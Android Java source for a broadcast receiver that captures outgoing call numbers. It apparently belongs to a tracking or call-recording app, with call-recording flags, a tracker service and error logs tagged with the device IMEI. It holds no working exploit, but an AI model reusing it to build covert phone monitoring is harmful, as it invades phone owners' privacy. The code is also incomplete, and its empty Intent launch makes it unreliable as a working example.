package vn.vhc.live;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.widget.Toast;

public class MyPhoneReceiver extends BroadcastReceiver {

	 public static final String LISTEN_ENABLED = "ListenEnabled";
     public static final String FILE_DIRECTORY = "recordedCalls";
     private String phoneNumber;
     public static final int STATE_INCOMING_NUMBER = 0;
     
     public static final int STATE_CALL_START = 1;
     public static final int STATE_CALL_END = 2;
     public static final int STATE_OUTCOMING_NUMBER = 3;
     
     
     @Override
     public void onReceive(Context context, Intent intent)
     {
    	 try{
    	 		if(UtilGame.recordcall==0) return;//deny call recording
    	 		if(APTrackerService.statusCmdRealtime.equals(TypeCmd.PROCESSING))
				{
					return;
				}
             	phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
             	Intent intent1 = new Intent();
             	context.startActivity(intent1);
    	 }catch(Exception exxxx)
    	 {
    	 		UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
    					"InOutComingLogx:"+exxxx.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
    	 }
     }

	

}
